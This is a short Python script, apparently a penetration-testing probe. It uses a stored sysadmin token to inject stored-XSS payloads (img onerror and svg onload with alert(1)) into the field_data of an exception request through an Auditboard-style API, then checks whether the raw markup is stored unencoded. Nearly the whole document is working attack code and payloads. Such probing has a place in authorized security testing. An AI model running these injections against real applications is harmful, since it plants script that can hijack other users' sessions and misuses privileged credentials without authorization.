import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
def req(m,p,body=None):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X',m,H+p,
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='ZXF'+uuid.uuid4().hex[:5]
print("=== field_data JSON blob: does it skip the encoder? ===")
payloads=[
 ('img', f'<img src=x onerror=alert(1)>{tag}'),
 ('bold', f'<b>{tag}</b>'),
 ('svg', f'<svg onload=alert(1)>{tag}'),
]
for label,pay in payloads:
    c,b=req('PUT','/api/v1/exception_requests/32',{"exception_request":{"field_data":{"zx_probe":pay}}})
    c2,b2=req('GET','/api/v1/exception_requests/32')
    stored=None
    try: stored=json.loads(b2)['exception_requests'][0].get('field_data')
    except: pass
    raw = pay in json.dumps(stored) if stored else False
    print(f"  {label:6} PUT={c}  field_data={json.dumps(stored)[:120]}")
    print(f"         RAW_STORED={raw}")
